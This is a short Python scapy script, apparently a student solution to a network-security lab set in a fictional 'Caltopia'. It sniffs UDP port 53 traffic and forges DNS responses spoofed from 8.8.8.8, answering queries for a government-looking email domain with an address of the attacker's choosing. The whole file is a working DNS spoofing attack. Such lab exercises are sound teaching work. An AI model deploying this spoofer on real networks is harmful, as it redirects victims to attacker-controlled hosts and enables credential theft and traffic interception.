#!/var/lib/python/python-q3

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

def handle_packet(pkt):

    # If you wanted to send a packet back out, it might look something like... 
    # ip = IP(...)
    # tcp = TCP(...) 
    # app = ...
    # msg = ip / tcp / app 
    # send(msg)

    dst_IP = pkt['IP'].dst
    domain_name = pkt[DNSQR].qname

    if dst_IP == '8.8.8.8' and domain_name == 'email.gov-of-caltopia.info.':
	   ip = IP(src= dst_IP, dst= pkt['IP'].src, proto='udp', id= pkt['IP'].id)
	   udp = UDP(sport=pkt['UDP'].dport, dport= pkt['UDP'].sport)
	   dns = DNS(id=pkt['DNS'].id, opcode='QUERY', rcode='ok', qd=DNSQR(qname = domain_name), an= DNSRR(rrname= domain_name, rdata= '10.87.51.132'))
	   msg = ip / udp / dns
	   send(msg)

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='udp port 53', iface='eth0')